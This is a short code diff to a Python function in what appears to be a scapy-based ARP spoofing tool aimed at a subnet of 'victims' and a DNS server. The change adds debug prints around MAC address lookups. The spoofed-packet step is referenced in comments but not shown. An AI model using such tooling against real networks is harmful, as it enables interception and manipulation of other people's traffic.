@@ -13,6 +13,7 @@ def arp():
 	self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))
 
 	if not self_mac:
+		print("Self mac not founded - aborting")
 		return
 
 	#retrieving MAC address from DNS server
@@ -22,6 +23,7 @@ def arp():
 	if mac_dns[0]:
 		mac_dns = mac_dns[0][0][1].hwsrc
 	else:
+		print("DNS mac not founded - aborting")
 		return
 
 	# Parse subnet of victims
@@ -36,6 +38,8 @@ def arp():
 		# Get the victim MAC address
 		arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(victim))
 		mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
+
+		print(mac_victim[0])
 		
 		# If mac addr is not found then consider that victim is offline, don't treat the victim
 		# Else add spoofed packets (DNS --> Victim and Victim --> DNS)
